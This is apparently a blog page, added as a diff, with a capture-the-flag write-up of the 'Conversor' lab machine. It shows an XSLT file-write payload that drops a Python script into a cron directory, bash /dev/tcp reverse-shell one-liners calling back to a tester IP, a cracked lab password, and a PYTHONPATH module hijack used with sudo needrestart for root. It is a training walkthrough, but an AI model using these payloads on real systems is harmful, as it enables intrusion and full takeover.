@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Conversor - CTF | 1xTP</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Conversor - CTF | 1xTrashPanda</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Conversor - CTF" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Exploiting XSLT injection for arbitrary file write to achieve RCE via cron jobs, followed by priv-esc through a vulnerable needrestart version." />
+<meta property="og:description" content="Exploiting XSLT injection for arbitrary file write to achieve RCE via cron jobs, followed by priv-esc through a vulnerable needrestart version." />
+<link rel="canonical" href="http://0.0.0.0:4000/writeups/Conversor/" />
+<meta property="og:url" content="http://0.0.0.0:4000/writeups/Conversor/" />
+<meta property="og:site_name" content="1xTrashPanda" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2026-03-21T00:00:00-07:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Conversor - CTF" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2026-03-21T00:00:00-07:00","datePublished":"2026-03-21T00:00:00-07:00","description":"Exploiting XSLT injection for arbitrary file write to achieve RCE via cron jobs, followed by priv-esc through a vulnerable needrestart version.","headline":"Conversor - CTF","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/writeups/Conversor/"},"url":"http://0.0.0.0:4000/writeups/Conversor/"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-left">
+            <a href="/index.html"><h2>1xTP</h2></a>
+        </div>
+        <div class="nav-right">
+            <a href="/about.html">About</a>
+            <a href="/categories.html">Categories</a>
+        </div>
+    </nav>
+
+    <div class="container">
+        <aside class="profile-card" id="profileCard">
+            <div class="sidebar-toggle" id="sidebarToggle">
+                <i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="profile-img">
+                <img src="/assets/raccoon-pfp.png" alt="1xTrashPanda" class="profile-pic">
+            </div>
+            
+            <div class="profile-info-container">
+                <div class="profile-nb-container">
+                    <div class="profile-username">
+                        <h3>1xTrashPanda</h3>
+                    </div>
+                    <p class="profile-bio">
+                        Focus: <span class="accent">Offensive Security</span><br>
+                        Specialty: <span class="accent">WebApps & AD</span>
+                    </p>
+                </div>
+
+                <div class="profile-links">
+                    <a href="https://github.com/1xTP" target="_blank">
+                        <i class="fab fa-github"></i> Github
+                    </a>
+                </div>
+            </div>
+        </aside>
+
+        <main class="web-content-container">
+            <article class="report-body">
+
+    <section class="report-section">
+        <h2>1. Overview</h2>
+        <p>This challenge involved exploiting a web application that processes XML and XSLT files. A flaw in how user-supplied XSLT files were handled allowed arbitrary file creation on the server. This was used to drop a malicious script into a directory executed by a cron job, resulting in remote code execution as the web server user. After gaining access, credentials were recovered from a local database, which allowed SSH access. Privilege escalation was then achieved by abusing a vulnerable version of <code>needrestart</code> to execute code as root.</p>
+    </section>
+
+    <section class="report-section">
+        <h2>2. Recon</h2>
+        <p>I began this machine with the standard Nmap port and service scan.</p>
+        <figure class="highlight"><pre><code class="language-text" data-lang="text">└─$ nmap -sCV 10.129.7.153 --min-rate 5000
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
+|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
+80/tcp open  http    Apache httpd 2.4.52
+|_http-title: Did not follow redirect to http://conversor.htb/
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></figure>
+        <p>The scan showed two open ports:</p>
+        <ul>
+            <li><b>22 (SSH)</b></li>
+            <li><b>80 (HTTP)</b></li>
+        </ul>
+        <p>The web server redirected to <code>conversor.htb</code>, so I added it to my hosts file and visited the site. The site had a simple login page that allowed account registration.</p>
+        <p>After logging in, I found that the site converts XML-formatted Nmap outputs into a styled report using XSLT.</p>
+        <p>While exploring the site, I found an option to download the application’s source code. Reading the source revealed that the backend was built using Flask. Looking at the <code>app.py</code> file, I noticed that uploaded XSLT files were not properly sanitized.</p>
+        <figure class="highlight"><pre><code class="language-text" data-lang="text">def convert():
+    if 'user_id' not in session:
+        return redirect(url_for('login'))
+    xml_file = request.files['xml_file']
+    xslt_file = request.files['xslt_file']
+    from lxml import etree
+    xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)
+    xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
+    xml_file.save(xml_path)
+    xslt_file.save(xslt_path)
+    try:
+        parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
+        xml_tree = etree.parse(xml_path, parser)
+        xslt_tree = etree.parse(xslt_path)
+        transform = etree.XSLT(xslt_tree)
+        result_tree = transform(xml_tree)
+        result_html = str(result_tree)
+        file_id = str(uuid.uuid4())
+        filename = f"{file_id}.html"
+        html_path = os.path.join(UPLOAD_FOLDER, filename)
+        with open(html_path, "w") as f:
+            f.write(result_html)
+        conn = get_db()
+        conn.execute("INSERT INTO files (id,user_id,filename) VALUES (?,?,?)", (file_id, session['user_id'], filename))
+        conn.commit()
+        conn.close()
+        return redirect(url_for('index'))
+    except Exception as e:
+        return f"Error: {e}"</code></pre></figure>
+        <p>User-controlled XSLT was being processed directly, which opened the door for abuse.</p>
+        <p>Additionally, the <code>install.md</code> file mentioned a cron job that executes Python scripts from a specific directory.</p>
+        <figure class="highlight"><pre><code class="language-text" data-lang="text">* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done</code></pre></figure>
+        <p>This meant that if I could place a Python file in that directory, it would be executed automatically.</p>
+    </section>
+
+    <section class="report-section">
+        <h2>3. Foothold</h2>
+        <p>With this info, I developed an exploit using a XSLT file. The goal was to write a Python script into the <code>/var/www/conversor.htb/scripts</code> directory, which would then be executed by the cron job.</p>
+        <figure class="highlight"><pre><code class="language-text" data-lang="text"># hehe.xslt
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:exploit="http://exslt.org/common" extension-element-prefixes="exploit" version="1.0"&gt;
+    &lt;xsl:template match="/"&gt;
+        &lt;exploit:document href="/var/www/conversor.htb/scripts/pwn.py" method="text"&gt;import os;os.system("bash -c 'bash &gt;&amp;amp; /dev/tcp/10.10.14.253/9001 0&gt;&amp;amp;1'")&lt;/exploit:document&gt;
+    &lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;</code></pre></figure>
+        <p>After uploading and processing this file, the site created <code>pwn.py</code> in the scripts directory. Within a minute, the cron job executed the script and I received a shell as the <code>www-data</code> user.</p>
+        <p>While enumerating the system, I remembered that the site used a SQLite database stored in the <code>instance</code> directory. From the shell, I was able to access it and extract credentials:</p>
+        <figure class="highlight"><pre><code class="language-text" data-lang="text">'fismathack':'5b5c3ac3a1c897c94caad48e6c71fdec'</code></pre></figure>
+        <p>I cracked the hash using Hashcat, which revealed the password: <code>Keepmesafeandwarm</code></p>
+        <p>Using these credentials, I was able to log in over SSH as the <code>fismathack</code> user.</p>
+    </section>
+
+    <section class="report-section">
+        <h2>4. Root</h2>
+        <p>After gaining SSH access, I began priv-esc enumeration. As usual, I started with: <code>sudo -l</code>. This showed that the user could run <code>/usr/sbin/needrestart</code> as root without a password.</p>
+        <p>To exploit this, I created a Python module that would be loaded when <code>needrestart</code> executed.</p>
+        <figure class="highlight"><pre><code class="language-text" data-lang="text"># /dev/shm/pwn/importlib/__init__.py
+        &lt;p&gt;import os&lt;/p&gt;
+        &lt;p&gt;if os.geteuid() == 0:&lt;br&gt;        os.system("bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.253/9001 0&gt;&amp;1'")&lt;br&gt;</code></pre></figure></p>
+        <p>I also created a simple Python script to keep a process running:</p>
+        <figure class="highlight"><pre><code class="language-text" data-lang="text"># /dev/shm/main.py
+        &lt;p&gt;while True:&lt;br&gt;	pass&lt;br&gt;</code></pre></figure></p>
+        <p>The exploit required three steps running in parallel.</p>
+        <p>First, I started a listener on my machine:</p>
+        <figure class="highlight"><pre><code class="language-text" data-lang="text">└─$ nc -lvnp 9001</code></pre></figure>
+        <p>Next, I ran the Python script with a modified <code>PYTHONPATH</code> so that my malicious module would be loaded:</p>
+        <figure class="highlight"><pre><code class="language-text" data-lang="text">fismathack@conversor:/dev/shm$ PYTHONPATH=/dev/shm/pwn python3 main.py</code></pre></figure>
+        <p>Finally, I executed <code>needrestart</code> with sudo:</p>
+        <figure class="highlight"><pre><code class="language-text" data-lang="text">fismathack@conversor:~$ sudo /usr/sbin/needrestart</code></pre></figure>
+        <p>When <code>needrestart</code> interacted with the running Python process, it loaded the malicious module, which triggered the reverse shell and provided root access.</p>
+    </section>
+
+    <section class="report-section">
+        <h2>5. Conclusion</h2>
+        <p>Initial access was gained by abusing the site’s handling of user-supplied XSLT files, which allowed arbitrary file creation on the server. This was used to place a Python script in a directory executed by a cron job, resulting in code execution as the <code>www-data</code> user.</p>
+        <p>From there, credentials were recovered from a local SQLite database and cracked, allowing SSH access as the <code>fismathack</code> user. Privilege escalation was achieved by exploiting a vulnerable version of <code>needrestart</code>, where a Python module was loaded during execution and resulted in a root shell.</p>
+    </section>
+
+    <footer class="report-footer">
+        --- [END OF PAGE] ---
+    </footer>
+</article>
+        </main>
+    </div>
+    <script>
+        const toggleBtn = document.getElementById('sidebarToggle');
+        const sidebar = document.querySelector('.profile-card');
+        const overlay = document.getElementById('mobileOverlay');
+
+        function toggleSidebar() {
+            sidebar.classList.toggle('active');
+            overlay.classList.toggle('active');
+        }
+
+        toggleBtn.addEventListener('click', toggleSidebar);
+
+        overlay.addEventListener('click', toggleSidebar);
+    </script>
+</body>
+</html>
